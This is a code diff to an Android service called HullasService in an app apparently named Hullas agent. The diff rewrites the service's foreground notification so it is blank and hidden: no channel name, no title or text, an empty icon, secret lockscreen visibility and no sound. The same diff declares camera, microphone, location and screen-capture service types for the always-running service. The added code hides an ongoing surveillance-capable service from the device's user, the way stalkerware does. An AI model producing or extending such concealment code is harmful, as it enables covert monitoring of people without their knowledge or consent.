@@ -3,9 +3,9 @@ package org.hullas.agent
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
@@ -27,13 +27,12 @@ class HullasService : Service() {
     override fun onCreate() {
         super.onCreate()
         ServiceLifecycleOwner.start()
-        startForeground(NOTIF_ID, buildNotification())
+        startSilentForeground()
         startPolling()
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
-    }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
+        START_STICKY
 
     override fun onDestroy() {
         pollJob?.cancel()
@@ -43,6 +42,22 @@ class HullasService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    private fun startSilentForeground() {
+        val notification = buildSilentNotification()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(
+                NOTIF_ID, notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
+            )
+        } else {
+            @Suppress("DEPRECATION")
+            startForeground(NOTIF_ID, notification)
+        }
+    }
 
     private fun startPolling() {
         pollJob?.cancel()
@@ -96,36 +111,37 @@ class HullasService : Service() {
         }
     }
 
-    private fun buildNotification(): Notification {
-        val channelId = "hullas_agent"
+    private fun buildSilentNotification(): Notification {
+        val channelId = "hullas_silent"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val ch = NotificationChannel(
-                channelId, getString(R.string.service_channel),
-                NotificationManager.IMPORTANCE_MIN,
+                channelId, " ", NotificationManager.IMPORTANCE_NONE,
             ).apply {
-                description = getString(R.string.service_running)
+                description = " "
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                 .createNotificationChannel(ch)
         }
-        val pi = PendingIntent.getActivity(
-            this, 0,
-            Intent(this, SetupActivity::class.java),
-            PendingIntent.FLAG_IMMUTABLE,
-        )
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle(getString(R.string.app_name))
-            .setContentText(getString(R.string.service_running))
-            .setSmallIcon(android.R.drawable.ic_menu_compass)
-            .setContentIntent(pi)
+            .setContentTitle(null)
+            .setContentText(null)
+            .setSmallIcon(R.drawable.ic_empty)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
             .setOngoing(true)
+            .setShowWhen(false)
+            .setLocalOnly(true)
             .build()
     }
 
     companion object {
-        const val NOTIF_ID = 42
+        const val NOTIF_ID = 1
 
         fun start(ctx: android.content.Context) {
             val i = Intent(ctx, HullasService::class.java)
